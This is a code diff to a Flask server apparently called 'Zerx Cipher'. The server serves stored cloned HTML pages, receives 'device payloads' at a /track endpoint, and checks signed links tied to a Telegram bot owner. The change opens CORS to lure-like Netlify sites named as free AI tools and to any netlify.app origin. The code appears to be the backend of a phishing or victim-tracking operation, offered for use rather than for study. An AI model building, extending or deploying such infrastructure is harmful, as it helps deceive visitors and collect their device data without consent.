@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 # server.py — Flask backend for Zerx Cipher
-# Endpoints: /api/verify (HMAC gate), /api/clone/<slug> (clone serving), /track (device payloads), /health
-# requirements: flask requests
+# Endpoints: /api/verify, /api/clone/<slug>, /track, /health
+# Includes permissive CORS so the Netlify-hosted pages can call it.
 
-from flask import Flask, request, jsonify, Response
+from flask import Flask, request, jsonify, Response, make_response
 import hmac, hashlib, time, sqlite3, os, json, base64
 from datetime import datetime, timezone
+from functools import wraps
 
 app = Flask(__name__)
 
@@ -14,16 +15,28 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
 DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
 
-def _sign(payload: str) -> str:
-    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]
+# Allowed origins for CORS (add more if needed)
+ALLOWED_ORIGINS = {
+    "https://best-free-ai-tool.netlify.app",
+    "https://best-free-ai-tools.netlify.app",
+    "https://subtle-sunburst-1d934f.netlify.app",
+}
 
-def _db():
-    c = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
-    c.row_factory = sqlite3.Row
-    return c
+@app.after_request
+def add_cors(resp):
+    origin = request.headers.get("Origin", "")
+    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
+        resp.headers["Access-Control-Allow-Origin"] = origin
+        resp.headers["Vary"] = "Origin"
+        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
+        resp.headers["Access-Control-Max-Age"] = "86400"
+    return resp
 
-@app.route("/api/verify", methods=["GET"])
+@app.route("/api/verify", methods=["GET", "OPTIONS"])
 def api_verify():
+    if request.method == "OPTIONS":
+        return ("", 204)
     uid_s = request.args.get("id", "")
     tok   = request.args.get("t", "")
     if not uid_s.isdigit() or not tok:
@@ -36,7 +49,7 @@ def api_verify():
         return jsonify({"ok": False, "reason": "malformed"}), 403
     if exp < int(time.time()):
         return jsonify({"ok": False, "reason": "expired"}), 403
-    expected = _sign(f"{uid}.{exp}")
+    expected = hmac.new(LINK_SECRET.encode(), f"{uid}.{exp}".encode(), hashlib.sha256).hexdigest()[:32]
     if not hmac.compare_digest(expected, sig):
         return jsonify({"ok": False, "reason": "bad_signature"}), 403
     return jsonify({"ok": True, "uid": uid})
@@ -44,7 +57,8 @@ def api_verify():
 @app.route("/api/clone/<slug>", methods=["GET"])
 def api_clone(slug):
     try:
-        con = _db()
+        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
+        con.row_factory = sqlite3.Row
         row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
         con.close()
     except Exception:
@@ -53,8 +67,10 @@ def api_clone(slug):
         return "Not found", 404
     return Response(row["html"], mimetype="text/html; charset=utf-8")
 
-@app.route("/track", methods=["POST"])
+@app.route("/track", methods=["POST", "OPTIONS"])
 def track():
+    if request.method == "OPTIONS":
+        return ("", 204)
     try:
         data = request.get_json(force=True) or {}
     except Exception:
